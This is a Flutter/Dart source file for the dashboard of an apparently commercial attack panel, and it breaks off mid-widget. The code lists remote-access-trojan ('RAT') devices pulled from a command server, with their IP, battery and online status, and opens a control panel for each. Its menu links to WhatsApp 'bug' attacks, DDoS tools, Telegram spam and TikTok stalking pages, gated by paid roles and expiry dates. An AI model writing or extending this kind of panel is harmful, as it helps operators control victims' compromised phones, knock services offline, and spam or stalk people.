import 'dart:async';
import 'dart:convert';
import 'dart:ui';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'package:video_player/video_player.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;

import 'device_permission.dart';
import 'home_page.dart';
import 'sender_page.dart';
import 'telegram.dart';
import 'ddos_page.dart';
import 'stalk_tiktok_page.dart';

class _D {
  static const bg = Color(0xFF050507);
  static const card = Color(0xFF141416);
  static const card2 = Color(0xFF1B1B1F);
  static const border = Color(0x35FFFFFF);
  static const text = Color(0xFFF3F3F5);
  static const muted = Color(0x99FFFFFF);
  static const gold = Color(0xFFC9A84B);
  static const green = Color(0xFF66D59A);
  static const blue = Color(0xFF70A7FF);
  static const purple = Color(0xFF9B8CFF);
  static const red = Color(0xFFFF7272);
}

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;

  final String password;
  final String expiredDate;
  final List<Map<String, dynamic>> listBug;
  final List<Map<String, dynamic>> listDDoS;

  const DeviceDashboardPage({
    super.key,
    required this.username,
    this.role = '',
    required this.sessionKey,
    this.password = '',
    this.expiredDate = '',
    this.listBug = const [],
    this.listDDoS = const [],
  });

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  late VideoPlayerController _bgVideoController;
  bool _bgVideoReady = false;

  late IO.Socket _socket;
  Timer? _timer;

  List<dynamic> _devices = [];
  String _pairId = '';
  PermissionResult? _permission;
  bool _isLoading = true;

  final TextEditingController _searchController = TextEditingController();
  String _searchQuery = '';

  final ScrollController _scrollController = ScrollController();
  final GlobalKey _devicesKey = GlobalKey();

  bool get _canAccessPairId {
    final role = widget.role.toLowerCase().trim();
    final normalized = role == 'hig admin'
        ? 'high admin'
        : role == 'reseler'
            ? 'reseller'
            : role;
    return [
      'vip',
      'owner',
      'reseller',
      'high admin',
      'admin',
      'founder',
      'dev',
      'high owner',
    ].contains(normalized);
  }

  int get _onlineCount => _devices.where(_isDeviceReallyOnline).length;

  @override
  void initState() {
    super.initState();
    _initBgVideo();
    _fetchDevices();
    _initSocket();

    _timer = Timer.periodic(const Duration(seconds: 10), (_) {
      if (mounted) setState(() {});
    });

    _searchController.addListener(() {
      if (mounted) {
        setState(() => _searchQuery = _searchController.text);
      }
    });
  }

  void _initBgVideo() {
    try {
      _bgVideoController =
          VideoPlayerController.asset('assets/videos/banner.mp4')
            ..initialize().then((_) {
              if (!mounted) return;
              setState(() => _bgVideoReady = true);
              _bgVideoController
                ..setLooping(true)
                ..setVolume(0)
                ..play();
            }).catchError((_) {});
    } catch (_) {}
  }

  void _initSocket() {
    try {
      _socket = IO.io(
        'https://omhc-termux-panel.yakuza.biz.id',
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setQuery({
              'type': 'admin',
              'id': 'ADMIN_PANEL_${widget.username}',
            })
            .enableAutoConnect()
            .build(),
      );

      _socket.onConnect((_) {
        debugPrint('[+] Dashboard socket connected');
      });

      _socket.on('target_status', (data) {
        if (!mounted || data is! Map) return;
        final index = _devices.indexWhere((d) => d['id'] == data['id']);
        if (index == -1) return;
        setState(() {
          _devices[index]['status'] =
              data['status'].toString().toLowerCase() == 'online'
                  ? 'Online'
                  : 'Offline';
          if (data['status'].toString().toLowerCase() == 'online') {
            _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
          }
        });
      });

      _socket.on('heartbeat', (data) {
        if (!mounted || data is! Map) return;
        final index = _devices.indexWhere((d) => d['id'] == data['deviceId']);
        if (index == -1) return;
        setState(() {
          _devices[index]['battery'] = data['battery'];
          _devices[index]['status'] = 'Online';
          _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
        });
      });

      _socket.on('device_info', (data) {
        if (mounted && data is Map && data['admin'] == widget.username) {
          _fetchDevices();
        }
      });

      _socket.connect();
    } catch (e) {
      debugPrint('Socket error: $e');
    }
  }

  Future<void> _fetchDevices() async {
    try {
      final pairResponse = await http
          .get(
            Uri.parse(
              'https://omhc-termux-panel.yakuza.biz.id/rat/pairid?key=${Uri.encodeComponent(widget.sessionKey)}',
            ),
          )
          .timeout(const Duration(seconds: 8));

      final devicesResponse = await http
          .get(
            Uri.parse(
              'https://omhc-termux-panel.yakuza.biz.id/rat/my-devices?key=${Uri.encodeComponent(widget.sessionKey)}',
            ),
          )
          .timeout(const Duration(seconds: 10));

      if (pairResponse.statusCode == 200) {
        final pairData = jsonDecode(pairResponse.body);
        if (pairData['valid'] == true && pairData['pairId'] != null) {
          _pairId = pairData['pairId'].toString();
        }
      }

      if (devicesResponse.statusCode != 200) {
        throw Exception('Server error ${devicesResponse.statusCode}');
      }

      final data = jsonDecode(devicesResponse.body);
      if (data['valid'] != true) {
        throw Exception(data['message'] ?? 'Gagal memuat device');
      }

      final devices = List<dynamic>.from(data['devices'] ?? const []);
      final permission = _canAccessPairId
          ? const PermissionResult(
              approved: true,
              allDevices: true,
              devices: [],
            )
          : await DevicePermissionStore.getFor(
              widget.username,
              widget.sessionKey,
            );

      if (!mounted) return;

      setState(() {
        _permission = permission;
        _devices = _canAccessPairId || permission.allDevices
            ? devices
            : devices
                .where(
                  (device) =>
                      permission.canSee(device['id']?.toString()),
                )
                .toList();
        _isLoading = false;
      });
    } catch (e) {
      debugPrint('Error fetching devices: $e');
      if (mounted) {
        setState(() {
          _isLoading = false;
          _devices = [];
        });
      }
    }
  }

  bool _isDeviceReallyOnline(dynamic device) {
    if (device['status'] == 'Offline' || device['lastSeen'] == null) {
      return false;
    }

    try {
      final lastSeen = DateTime.parse(device['lastSeen'].toString());
      return DateTime.now().difference(lastSeen).inSeconds <= 20;
    } catch (_) {
      return false;
    }
  }

  List<dynamic> get _filteredDevices {
    if (_searchQuery.trim().isEmpty) return _devices;
    final q = _searchQuery.toLowerCase();
    return _devices.where((d) {
      final value = '${d['model']} ${d['id']} ${d['ip']}'.toLowerCase();
      return value.contains(q);
    }).toList();
  }

  void _copyPairId() {
    if (!_canAccessPairId || _pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('ID pairing berhasil disalin')),
    );
  }

  void _openRat() {
    final contextToUse = _devicesKey.currentContext;
    if (contextToUse != null) {
      Scrollable.ensureVisible(
        contextToUse,
        duration: const Duration(milliseconds: 450),
        curve: Curves.easeOutCubic,
      );
    }
  }

  Future<void> _openSupport() async {
    final uri = Uri.parse('https://t.me/Xcut');
    try {
      await launchUrl(uri, mode: LaunchMode.externalApplication);
    } catch (_) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Tidak dapat membuka Support')),
        );
      }
    }
  }

  void _openHistory() {
    final recent = [..._devices]
      ..sort((a, b) {
        final aa = DateTime.tryParse(a['lastSeen']?.toString() ?? '') ??
            DateTime.fromMillisecondsSinceEpoch(0);
        final bb = DateTime.tryParse(b['lastSeen']?.toString() ?? '') ??
            DateTime.fromMillisecondsSinceEpoch(0);
        return bb.compareTo(aa);
      });

    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (_) => Container(
        padding: const EdgeInsets.fromLTRB(18, 12, 18, 24),
        decoration: const BoxDecoration(
          color: Color(0xFF111113),
          borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
        ),
        child: SafeArea(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                width: 38,
                height: 4,
                decoration: BoxDecoration(
                  color: Colors.white24,
                  borderRadius: BorderRadius.circular(4),
                ),
              ),
              const SizedBox(height: 14),
              const Align(
                alignment: Alignment.centerLeft,
                child: Text(
                  'RIWAYAT DEVICE',
                  style: TextStyle(
                    color: _D.text,
                    fontFamily: 'ShareTechMono',
                    letterSpacing: 1.5,
                    fontSize: 13,
                  ),
                ),
              ),
              const SizedBox(height: 10),
              if (recent.isEmpty)
                const Padding(
                  padding: EdgeInsets.all(22),
                  child: Text(
                    'Belum ada riwayat device.',
                    style: TextStyle(color: _D.muted),
                  ),
                )
              else
                Flexible(
                  child: ListView.builder(
                    shrinkWrap: true,
                    itemCount: recent.length > 8 ? 8 : recent.length,
                    itemBuilder: (_, i) {
                      final d = recent[i];
                      return ListTile(
                        dense: true,
                        leading: const Icon(
                          Icons.phone_android_rounded,
                          color: _D.muted,
                        ),
                        title: Text(
                          d['model']?.toString() ?? 'Unknown Device',
                          style: const TextStyle(color: _D.text),
                        ),
                        subtitle: Text(
                          d['lastSeen']?.toString() ?? '-',
                          style: const TextStyle(color: _D.muted),
                        ),
                      );
                    },
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  void _showNotification() {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(
          _devices.isEmpty
              ? 'Tidak ada device yang terhubung.'
              : '${_onlineCount} device sedang online.',
        ),
      ),
    );
  }

  void _openWhatsapp() {
    if (widget.listBug.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(
          content: Text(
            'Data bug WhatsApp belum diteruskan oleh halaman sebelumnya.',
          ),
        ),
      );
      return;
    }

    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => AttackPage(
          username: widget.username,
          password: widget.password,
          listBug: widget.listBug,
          role: widget.role,
          expiredDate: widget.expiredDate,
          sessionKey: widget.sessionKey,
        ),
      ),
    );
  }

  void _openSender() {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => SenderPage(sessionKey: widget.sessionKey),
      ),
    );
  }

  void _openTools() {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => ToolsPage(
          sessionKey: widget.sessionKey,
          userRole: widget.role,
          username: widget.username,
          listDDoS: widget.listDDoS,
        ),
      ),
    );
  }

  void _openTelegram() {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => TelegramSpamPage(sessionKey: widget.sessionKey),
      ),
    );
  }

  void _openTikTok() {
    Navigator.of(context).push(
      MaterialPageRoute(builder: (_) => const StalkTikTokPage()),
    );
  }

  @override
  void dispose() {
    _timer?.cancel();
    _searchController.dispose();
    _scrollController.dispose();
    _socket.disconnect();
    _socket.dispose();
    _bgVideoController.dispose();
    super.dispose();
  }
  @override
  Widget build(BuildContext context) {
    final total = _devices.length;
    final online = _onlineCount;
    final offline = total - online;

    return Scaffold(
      backgroundColor: _D.bg,
      body: Stack(
        children: [
          Positioned.fill(
            child: _bgVideoReady && _bgVideoController.value.isInitialized
                ? FittedBox(
                    fit: BoxFit.cover,
                    child: SizedBox(
                      width: _bgVideoController.value.size.width,
                      height: _bgVideoController.value.size.height,
                      child: VideoPlayer(_bgVideoController),
                    ),
                  )
                : Container(color: _D.bg),
          ),
          Positioned.fill(
            child: BackdropFilter(
              filter: ImageFilter.blur(sigmaX: 1.5, sigmaY: 1.5),
              child: Container(color: Colors.black.withOpacity(0.78)),
            ),
          ),
          SafeArea(
            child: Column(
              children: [
                _buildHeader(),
                Expanded(
                  child: SingleChildScrollView(
                    controller: _scrollController,
                    padding: const EdgeInsets.fromLTRB(18, 10, 18, 100),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        _buildProfileCard(total, online),
                        const SizedBox(height: 14),
                        _buildStats(total, online, offline),
                        const SizedBox(height: 20),
                        _sectionTitle('QUICK MENU'),
                        const SizedBox(height: 10),
                        _buildQuickMenu(),
                        const SizedBox(height: 20),
                        _sectionTitle('JADWAL SHOLAT'),
                        const SizedBox(height: 10),
                        _buildPrayerCard(),
                        const SizedBox(height: 20),
                        _sectionTitle('MARKET'),
                        const SizedBox(height: 10),
                        _buildMarketCard(),
                        const SizedBox(height: 20),
                        _sectionTitle('LATEST NEWS'),
                        const SizedBox(height: 10),
                        _buildNewsCard(),
                        const SizedBox(height: 20),
                        Container(key: _devicesKey),
                        _sectionTitle('RAT DEVICES'),
                        const SizedBox(height: 10),
                        _buildDeviceSection(total, online, offline),
                      ],
                    ),
                  ),
                ),
              ],
            ),
          ),
          Positioned(
            left: 16,
            right: 16,
            bottom: 14,
            child: _buildBottomNav(),
          ),
        ],
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      height: 66,
      padding: const EdgeInsets.symmetric(horizontal: 18),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.74),
        border: const Border(
          bottom: BorderSide(color: Colors.white12),
        ),
      ),
      child: Row(
        children: [
          _roundButton(
            Icons.grid_view_rounded,
            () => _scrollController.animateTo(
              0,
              duration: const Duration(milliseconds: 450),
              curve: Curves.easeOut,
            ),
          ),
          const SizedBox(width: 14),
          const Expanded(
            child: Text(
              'Xcut XC1',
              style: TextStyle(
                color: _D.text,
                fontFamily: 'MADEEvolveSansEVO',
                fontSize: 20,
                letterSpacing: 1.3,
                fontWeight: FontWeight.w500,
              ),
            ),
          ),
          _roundButton(Icons.headphones_rounded, _openSupport),
          const SizedBox(width: 10),
          _roundButton(Icons.power_settings_new_rounded, () {
            Navigator.of(context).maybePop();
          }, color: _D.red),
        ],
      ),
    );
  }

  Widget _roundButton(
    IconData icon,
    VoidCallback onTap, {
    Color color = _D.text,
  }) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(22),
        child: Container(
          width: 42,
          height: 42,
          decoration: BoxDecoration(
            color: Colors.white.withOpacity(0.07),
            shape: BoxShape.circle,
            border: Border.all(color: Colors.white12),
          ),
          child: Icon(icon, color: color, size: 20),
        ),
      ),
    );
  }

  Widget _buildProfileCard(int total, int online) {
    final exp = widget.expiredDate.isEmpty ? '2029-06-15' : widget.expiredDate;

    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            const Color(0xFF29292D).withOpacity(0.72),
            Colors.black.withOpacity(0.78),
            const Color(0xFF151519).withOpacity(0.82),
          ],
        ),
        borderRadius: BorderRadius.circular(25),
        border: Border.all(color: Colors.white.withOpacity(0.17)),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.28),
            blurRadius: 18,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: Column(
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.06),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.white12),
                ),
                child: Row(
                  children: const [
                    Icon(Icons.access_time_rounded, color: _D.gold, size: 12),
                    SizedBox(width: 5),
                    Text(
                      '20:05',
                      style: TextStyle(
                        color: _D.text,
                        fontFamily: 'ShareTechMono',
                        fontSize: 11,
                      ),
                    ),
                  ],
                ),
              ),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.06),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: Colors.white12),
                ),
                child: Row(
                  children: const [
                    Icon(Icons.battery_charging_full_rounded, color: _D.green, size: 12),
                    SizedBox(width: 5),
                    Text(
                      '32%',
                      style: TextStyle(
                        color: _D.text,
                        fontFamily: 'ShareTechMono',
                        fontSize: 11,
                      ),
                    ),
                  ],
                ),
              ),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                decoration: BoxDecoration(
                  color: _D.gold.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: _D.gold.withOpacity(0.6)),
                ),
                child: Row(
                  children: const [
                    Icon(Icons.workspace_premium_rounded, color: _D.gold, size: 12),
                    SizedBox(width: 4),
                    Text(
                      'OWNER',
                      style: TextStyle(
                        color: _D.gold,
                        fontSize: 10,
                        letterSpacing: 1,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 14),
          Row(
            children: [
              Container(
                width: 62,
                height: 62,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: Colors.white.withOpacity(0.06),
                  border: Border.all(color: _D.gold.withOpacity(0.75)),
                ),
                child: Center(
                  child: Text(
                    widget.username.isEmpty
                        ? 'Z'
                        : widget.username[0].toUpperCase(),
                    style: const TextStyle(
                      color: _D.text,
                      fontSize: 28,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        Flexible(
                          child: Text(
                            widget.username.isEmpty ? 'zamm' : widget.username,
                            maxLines: 1,
                            overflow: TextOverflow.ellipsis,
                            style: const TextStyle(
                              color: _D.text,
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ),
                        const SizedBox(width: 5),
                        const Icon(
                          Icons.verified,
                          color: _D.blue,
                          size: 15,
                        ),
                      ],
                    ),
                    const SizedBox(height: 4),
                    Row(
                      children: const [
                        Icon(Icons.phone_android_rounded, color: _D.muted, size: 12),
                        SizedBox(width: 4),
                        Text(
                          'samsung SM-A065F',
                          style: TextStyle(
                            color: _D.muted,
                            fontSize: 11,
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 2),
                    Row(
                      children: [
                        const Icon(Icons.calendar_today_rounded, color: _D.muted, size: 11),
                        const SizedBox(width: 4),
                        Text(
                          'Exp: $exp',
                          style: const TextStyle(
                            color: _D.muted,
                            fontSize: 11,
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildStats(int total, int online, int offline) {
    return Row(
      children: [
        _miniStat(Icons.people_alt_rounded, 'ONLINE', '$online', _D.green),
        const SizedBox(width: 8),
        _miniStat(Icons.link_rounded, 'SENDER', '0', _D.blue),
        const SizedBox(width: 8),
        _miniStat(Icons.access_time_rounded, '2029-06-...', 'EXP', _D.gold),
      ],
    );
  }

  Widget _miniStat(IconData icon, String title, String value, Color color) {
    return Expanded(
      child: Container(
        height: 64,
        padding: const EdgeInsets.all(8),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.52),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: Colors.white12),
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(icon, color: color, size: 15),
                const SizedBox(width: 5),
                Text(
                  value,
                  style: TextStyle(
                    color: _D.text,
                    fontFamily: 'ShareTechMono',
                    fontSize: 12,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 3),
            Text(
              title,
              style: const TextStyle(
                color: _D.muted,
                fontSize: 9,
                letterSpacing: 0.8,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _sectionTitle(String title) {
    return Row(
      children: [
        Container(
          width: 3,
          height: 17,
          decoration: BoxDecoration(
            color: _D.text,
            borderRadius: BorderRadius.circular(3),
            boxShadow: [
              BoxShadow(
                color: Colors.white.withOpacity(0.16),
                blurRadius: 5,
              ),
            ],
          ),
        ),
        const SizedBox(width: 9),
        Expanded(
          child: Text(
            title,
            style: const TextStyle(
              color: _D.text,
              fontFamily: 'MADEEvolveSansEVO',
              fontSize: 14,
              letterSpacing: 1.4,
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildQuickMenu() {
    final items = <_MenuItem>[
      _MenuItem('WhatsApp', FontAwesomeIcons.whatsapp, _D.green, _openWhatsapp),
      _MenuItem('RAT', FontAwesomeIcons.mobileScreenButton, _D.red, _openRat),
      _MenuItem('Sender', FontAwesomeIcons.paperPlane, _D.blue, _openSender),
      _MenuItem('Tools', FontAwesomeIcons.wrench, _D.purple, _openTools),
      _MenuItem('Telegram', FontAwesomeIcons.telegram, _D.blue, _openTelegram),
      _MenuItem('TikTok', FontAwesomeIcons.tiktok, _D.red, _openTikTok),
      _MenuItem('Riwayat', Icons.history_rounded, _D.gold, _openHistory),
      _MenuItem('Support', Icons.support_agent_rounded, Colors.white, _openSupport),
    ];

    return GridView.builder(
      shrinkWrap: true,
      physics: const NeverScrollableScrollPhysics(),
      itemCount: items.length,
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 4,
        crossAxisSpacing: 9,
        mainAxisSpacing: 9,
        childAspectRatio: 0.91,
      ),
      itemBuilder: (_, i) => _menuCard(items[i]),
    );
  }

  Widget _menuCard(_MenuItem item) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: item.onTap,
        borderRadius: BorderRadius.circular(19),
        child: Ink(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                const Color(0xFF222225).withOpacity(0.92),
                const Color(0xFF101012).withOpacity(0.94),
              ],
            ),
            borderRadius: BorderRadius.circular(19),
            border: Border.all(color: Colors.white.withOpacity(0.13)),
          ),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(
                width: 38,
                height: 38,
                decoration: BoxDecoration(
                  color: item.color.withOpacity(0.10),
                  shape: BoxShape.circle,
                  border: Border.all(color: item.color.withOpacity(0.35)),
                ),
                child: Center(
                  child: item.icon is IconData
                      ? Icon(
                          item.icon as IconData,
                          color: item.color,
                          size: 17,
                        )
                      : FaIcon(
                          item.icon as FaIconData,
                          color: item.color,
                          size: 17,
                        ),
                ),
              ),
              const SizedBox(height: 9),
              Text(
                item.label,
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
                style: const TextStyle(
                  color: _D.text,
                  fontFamily: 'MADEEvolveSansEVO',
                  fontSize: 9,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildPrayerCard() {
    const prayers = [
      ['Imsak', '04:51', Icons.nightlight_round],
      ['Subuh', '05:01', Icons.wb_twilight_rounded],
      ['Dzuhur', '11:56', Icons.wb_sunny_outlined],
      ['Ashar', '15:18', Icons.settings_outlined],
      ['Maghrib', '17:55', Icons.light_mode_rounded],
    ];

    return Container(
      padding: const EdgeInsets.symmetric(vertical: 13, horizontal: 5),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.55),
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: Colors.white12),
      ),
      child: Row(
        children: prayers.map((p) {
          return Expanded(
            child: Column(
              children: [
                Icon(
                  p[2] as IconData,
                  color: _D.gold,
                  size: 17,
                ),
                const SizedBox(height: 5),
                Text(
                  p[0] as String,
                  style: const TextStyle(color: _D.muted, fontSize: 9),
                ),
                const SizedBox(height: 2),
                Text(
                  p[1] as String,
                  style: const TextStyle(
                    color: _D.text,
                    fontFamily: 'ShareTechMono',
                    fontSize: 12,
                  ),
                ),
              ],
            ),
          );
        }).toList(),
      ),
    );
  }

  Widget _buildMarketCard() {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 9),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.55),
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: Colors.white12),
      ),
      child: Column(
        children: [
          _marketRow('A', 'Apple inc.', 'AAPL', '\$311.34', '+0.04%'),
          Divider(height: 1, color: Colors.white.withOpacity(0.06)),
          _marketRow('G', 'Alphabet inc.', 'GOOGL', '\$344.39', '+3.72%'),
        ],
      ),
    );
  }

  Widget _marketRow(
    String logo,
    String name,
    String ticker,
    String price,
    String change,
  ) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 9),
      child: Row(
        children: [
          Container(
            width: 38,
            height: 38,
            decoration: BoxDecoration(
              color: Colors.white.withOpacity(0.06),
              borderRadius: BorderRadius.circular(9),
              border: Border.all(color: Colors.white12),
            ),
            child: Center(
              child: Text(
                logo,
                style: const TextStyle(
                  color: _D.text,
                  fontFamily: 'MADEEvolveSansEVO',
                  fontSize: 17,
                ),
              ),
            ),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  name,
                  style: const TextStyle(color: _D.text, fontSize: 12),
                ),
                Text(
                  ticker,
                  style: const TextStyle(color: _D.muted, fontSize: 9),
                ),
              ],
            ),
          ),
          Container(
            width: 70,
            height: 26,
            decoration: const BoxDecoration(),
            child: CustomPaint(painter: _SparklinePainter()),
          ),
          const SizedBox(width: 9),
          Column(
            crossAxisAlignment: CrossAxisAlignment.end,
            children: [
              Text(
                price,
                style: const TextStyle(
                  color: _D.text,
                  fontFamily: 'ShareTechMono',
                  fontSize: 13,
                ),
              ),
              Text(
                change,
                style: const TextStyle(color: _D.green, fontSize: 9),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildNewsCard() {
    return SizedBox(
      height: 105,
      child: ClipRRect(
        borderRadius: BorderRadius.circular(18),
        child: Stack(
          fit: StackFit.expand,
          children: [
            Container(
              color: _D.card,
              child: const Center(
                child: Text(
                  'feel all right  •  feel you',
                  style: TextStyle(
                    color: _D.muted,
                    fontFamily: 'ShareTechMono',
                    fontSize: 14,
                    letterSpacing: 2,
                  ),
                ),
              ),
            ),
            Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [
                    Colors.black.withOpacity(0.08),
                    Colors.black.withOpacity(0.72),
                  ],
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                ),
              ),
            ),
            const Positioned(
              left: 14,
              bottom: 12,
              child: Text(
                'LATEST NEWS',
                style: TextStyle(
                  color: Colors.white,
                  fontFamily: 'MADEEvolveSansEVO',
                  fontSize: 13,
                  letterSpacing: 1,
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildDeviceSection(int total, int online, int offline) {
    return Column(
      children: [
        Row(
          children: [
            Expanded(
              child: Container(
                padding: const EdgeInsets.fromLTRB(12, 2, 3, 2),
                decoration: BoxDecoration(
                  color: Colors.black.withOpacity(0.55),
                  borderRadius: BorderRadius.circular(15),
                  border: Border.all(color: Colors.white12),
                ),
                child: TextField(
                  controller: _searchController,
                  style: const TextStyle(color: _D.text, fontSize: 12),
                  decoration: const InputDecoration(
                    icon: Icon(Icons.search_rounded, color: _D.muted, size: 18),
                    hintText: 'Search device, IP, ID...',
                    hintStyle: TextStyle(color: _D.muted, fontSize: 11),
                    border: InputBorder.none,
                  ),
                ),
              ),
            ),
            const SizedBox(width: 8),
            _smallAction(Icons.refresh_rounded, () {
              setState(() => _isLoading = true);
              _fetchDevices();
            }),
          ],
        ),
        const SizedBox(height: 10),
        if (_permission != null &&
            !_permission!.approved &&
            !_canAccessPairId)
          Container(
            width: double.infinity,
            margin: const EdgeInsets.only(bottom: 10),
            padding: const EdgeInsets.all(11),
            decoration: BoxDecoration(
              color: _D.red.withOpacity(0.08),
              borderRadius: BorderRadius.circular(13),
              border: Border.all(color: _D.red.withOpacity(0.25)),
            ),
            child: const Text(
              'Akses device belum disetujui Owner.',
              style: TextStyle(color: _D.red, fontSize: 10),
            ),
          ),
        if (_canAccessPairId || _pairId.isNotEmpty)
          GestureDetector(
            onTap: _copyPairId,
            child: Container(
              width: double.infinity,
              margin: const EdgeInsets.only(bottom: 10),
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.black.withOpacity(0.55),
                borderRadius: BorderRadius.circular(15),
                border: Border.all(color: _D.gold.withOpacity(0.25)),
              ),
              child: Row(
                children: [
                  const Icon(Icons.link_rounded, color: _D.gold, size: 18),
                  const SizedBox(width: 9),
                  Expanded(
                    child: Text(
                      _canAccessPairId
                          ? (_pairId.isEmpty ? 'MEMUAT PAIRING ID...' : _pairId)
                          : 'PAIRING ID TERBATAS',
                      style: const TextStyle(
                        color: _D.text,
                        fontFamily: 'ShareTechMono',
                        fontSize: 11,
                        letterSpacing: 1,
                      ),
                    ),
                  ),
                  if (_canAccessPairId)
                    const Icon(Icons.copy_rounded, color: _D.muted, size: 16),
                ],
              ),
            ),
          ),
        if (_isLoading)
          const Padding(
            padding: EdgeInsets.all(28),
            child: CircularProgressIndicator(color: _D.gold),
          )
        else if (_filteredDevices.isEmpty)
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.5),
              borderRadius: BorderRadius.circular(18),
              border: Border.all(color: Colors.white12),
            ),
            child: const Column(
              children: [
                Icon(Icons.devices_other_rounded, color: _D.muted, size: 34),
                SizedBox(height: 9),
                Text(
                  'NO DEVICES FOUND',
                  style: TextStyle(
                    color: _D.muted,
                    fontFamily: 'ShareTechMono',
                    fontSize: 11,
                    letterSpacing: 1.3,
                  ),
                ),
              ],
            ),
          )
        else
          ..._filteredDevices.map(_deviceCard),
      ],
    );
  }

  Widget _deviceCard(dynamic device) {
    final active = _isDeviceReallyOnline(device);
    final color = active ? _D.green : _D.red;

    return GestureDetector(
      onTap: () {
        Navigator.pushNamed(
          context,
          '/control_panel',
          arguments: {
            'device': device,
            'operator': widget.username,
            'sessionKey': widget.sessionKey,
          },
        );
      },
      child: Container(
        width: double.infinity,
        margin: const EdgeInsets.only(bottom: 9),
        padding: const EdgeInsets.all(13),
        decoration: BoxDecoration(
          color: Colors.black.withOpacity(0.56),
          borderRadius: BorderRadius.circular(17),
          border: Border.all(color: active ? color.withOpacity(0.28) : Colors.white12),
        ),
        child: Row(
          children: [
            Container(
              width: 42,
              height: 42,
              decoration: BoxDecoration(
                color: color.withOpacity(0.09),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: color.withOpacity(0.25)),
              ),
              child: Icon(
                Icons.phone_android_rounded,
                color: color,
